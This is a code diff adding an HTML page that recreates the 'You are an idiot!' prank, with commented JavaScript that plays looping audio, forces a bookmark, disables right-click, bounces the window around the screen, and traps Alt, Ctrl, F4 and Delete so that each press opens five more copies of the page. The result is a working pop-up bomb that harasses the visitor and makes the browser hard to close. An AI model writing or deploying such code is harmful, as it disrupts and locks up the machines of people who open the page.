@@ -1,0 +1,77 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+<head>
+    <title>You are an idiot!</title>
+</head>
+<body bgcolor="#ffffff" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onclick="addBookmark()">
+
+    <!-- Dual Audio for IE & Netscape -->
+    <bgsound src="idiotl.wav" loop="infinite">
+    <embed src="idiotl.wav" autostart="true" loop="true" hidden="true" width="0" height="0">
+
+    <!-- Raw GIF Display -->
+    <div align="center">
+        <img src="flashl.gif" alt="You are an idiot!" width="350" height="280">
+    </div>
+
+    <script language="JavaScript">
+        // 1. Auto-Bookmark Trap
+        function addBookmark() {
+            if (navigator.appName == "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {
+                window.external.AddFavorite(location.href, "You are an idiot!");
+            }
+        }
+
+        // 2. Disable Context Menu
+        function blockRightClick() {
+            return false;
+        }
+        document.oncontextmenu = blockRightClick;
+
+        // 3. Independent Window Bounce Loop
+        var flagRun = 1;
+        var xOff = 5;
+        var yOff = 5;
+        var xPos = Math.floor(Math.random() * (screen.width - 357));
+        var yPos = Math.floor(Math.random() * (screen.height - 330));
+
+        function playBall() {
+            if (flagRun != 1) return;
+            
+            xPos += xOff;
+            yPos += yOff;
+            
+            if (xPos > screen.width - 357) xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+            if (xPos < 0) xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+            if (yPos > screen.height - 330) yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+            if (yPos < 0) yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+            
+            window.moveTo(xPos, yPos);
+            window.setTimeout("playBall()", 20);
+        }
+
+        // 4. Pop-up Spawner targeting itself
+        function openWindow(url) {
+            window.open(url, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes");
+        }
+
+        function procreate() {
+            for (var i = 0; i < 5; i++) {
+                openWindow("legacylol.html");
+            }
+        }
+
+        // 5. Key Traps
+        function keyTrap() {
+            if (event.keyCode == 18 || event.keyCode == 115 || event.keyCode == 17 || event.keyCode == 46) {
+                alert("You are an idiot!");
+                procreate();
+            }
+        }
+        document.onkeydown = keyTrap;
+
+        // Start Bouncing
+        playBall();
+    </script>
+</body>
+</html>
